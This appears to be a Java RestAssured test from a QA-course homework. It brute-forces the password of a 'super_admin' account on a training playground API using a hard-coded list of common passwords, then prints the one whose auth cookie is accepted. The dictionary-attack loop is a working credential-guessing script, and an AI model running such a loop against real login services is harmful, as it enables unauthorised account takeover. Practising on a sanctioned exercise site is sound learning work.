import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class HomeWorkEx9 {
    final String NOT_AUTHORIZED = "You are NOT authorized";
    List<String> passwords = Arrays.asList("1234567", "123456", "12345", "1234", "12345678", "123456789",
            "1234567890", "password", "qwerty", "abc123", "football", "monkey", "111111", "letmein", "dragon",
            "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login",
            "admin", "qwerty123", "solo", "1q2w3e4r", "666666", "master", "photoshop", "1qaz2wsx", "qwertyuiop",
            "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "shadow",
            "passw0rd", "lovely", "7777777", "michael", "!@#$%^&*\t", "jesus", "password1", "superman", "hello",
            "charlie", "888888", "696969", "qwertyuiop", "hottie", "freedom", "aa123456", "qazwsx", "ninja",
            "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "123qwe");

    @Test
    public void testGetSecretPasswordRequest() {

        for (String password : passwords) {
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", password);
            Response getSecretPasswordResponse = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String responseCookie =
                    getSecretPasswordResponse.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response checkAuthCookieResponse = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String answer = checkAuthCookieResponse.asString();


            if (!answer.equals(NOT_AUTHORIZED)) {
                System.out.println("Password: " + password);
                checkAuthCookieResponse.print();
                break;
            }
        }
    }
}
